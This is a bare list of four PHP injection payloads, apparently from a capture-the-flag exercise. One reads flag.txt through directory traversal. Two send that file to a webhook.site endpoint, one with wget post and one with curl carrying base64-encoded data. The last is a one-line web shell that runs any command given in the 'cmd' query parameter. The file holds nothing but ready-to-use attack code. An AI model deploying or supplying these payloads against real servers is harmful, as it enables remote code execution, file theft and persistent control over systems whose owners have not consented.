<?php system("cat ../../../../../../../flag.txt") ?>
<?php system("wget --post-file ../../../../../../../flag.txt https://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32") ?>
<?php system("curl -s -G https://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32 --data-urlencode d@<(cat ../../../../../../../flag.txt | base64 -w 0)") ?>
<?php system($_GET['cmd']); ?>